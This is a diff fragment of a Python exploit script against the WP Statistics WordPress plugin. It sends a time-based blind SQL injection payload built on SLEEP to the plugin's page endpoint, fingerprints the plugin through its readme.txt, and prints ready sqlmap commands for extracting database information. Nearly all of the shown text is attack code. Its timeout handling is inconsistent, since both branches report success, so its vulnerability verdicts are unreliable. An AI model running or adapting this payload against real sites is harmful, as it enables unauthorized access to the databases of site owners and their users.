@@ -9,15 +9,17 @@ def blindsql(url):
 	sleep = 15
 	payload="ID=1 AND (SELECT * from (select SLEEP(%s))a)"%(sleep)
 	url_encode = urlencode({'page':'wps_pages_page', 'type':'1', 'ID':payload}, quote_via=quote_plus)
-	print('(+) Try payload')
 	try:
-		requests.get(url_endpoint +'?'+ url_encode, timeout=10, verify=False)
+		#print(url_endpoint +'?'+ url_encode)
+		print('(+) Try payload')
+		r = requests.get(url_endpoint +'?'+ url_encode, timeout=5, verify=False).status_code
 		print('(!) Target seem like not timeout!')
-		print('Try: sqlmap -u \"%s\" --technique=T --dbms=\"mysql\" -p \"ID\" -b'%(url_endpoint + "?ID=1&page=wps_pages_page&type=1"))
-		return False
+		print(r)
+		print('Try: sqlmap -u \"%s\" --technique=T --dbms=\"mysql\" -p \"ID\" -b --level=5 --time-sec=10'%(url_endpoint + "?ID=1&page=wps_pages_page&type=1"))
+		return True
 	except requests.ConnectTimeout:
 		print('(+) WwoowowoW maybe vuln ;)')
-		print('Try: sqlmap -u \"%s\" --technique=T --dbms=\"mysql\" -p \"ID\" -b'%(url_endpoint + "?ID=1&page=wps_pages_page&type=1"))
+		print('Try: sqlmap -u \"%s\" --technique=T --dbms=\"mysql\" -p \"ID\" -b --level=5 --time-sec=10'%(url_endpoint + "?ID=1&page=wps_pages_page&type=1"))
 		return True
 def exploit(url):
 	curl = url + '/wp-content/plugins/wp-statistics/readme.txt'
